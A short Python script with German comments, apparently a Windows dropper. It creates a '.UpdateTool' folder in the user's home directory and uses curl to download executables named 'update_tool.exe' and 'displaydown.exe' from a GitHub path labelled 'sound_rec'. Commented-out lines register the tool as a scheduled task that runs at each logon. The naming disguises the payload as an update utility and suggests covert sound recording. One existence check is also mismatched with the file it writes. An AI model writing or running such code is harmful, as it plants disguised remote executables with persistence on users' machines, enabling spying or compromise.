import os

#temppath zu python holen
tmp = os.environ.get('TMP')

# homepath zu python holen
home = os.environ.get('homepath')

# newpath festlegen
newpath_home = home + r'\.UpdateTool'
newpath_tmp = tmp + r'\UpdateTool'
# falls newpath nicht existiert erstelle ihn
if not os.path.exists(newpath_home):
  os.makedirs(newpath_home)


url = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/dist/update_tool.exe'
url2 = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/displaydown.exe'
url3 = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/dist/displayout.exe'
# nachladen von update_tool.exe
if not os.path.exists(newpath_home + r'\update_tool.exe'):
    os.system('cmd /c "curl ' + url + ' -o  ' + newpath_home + r'\update_tool.exe"')

# nachladen von displaydown.exe
if not os.path.exists(newpath_tmp + r'\update_tool.exe'):
    os.system('cmd /c "curl ' + url2 + ' -o  ' + newpath_tmp + r'\displaydown.exe"')

# erstellung der scheduled task mit keyboard




#old stuff dont need anymore
#import subprocess
#subprocess.call(['runas', 'schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\update_tool.exe'])
#os.system(r'cmd /c "schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\update_tool.exe"')
#os.system()
print("fertig")
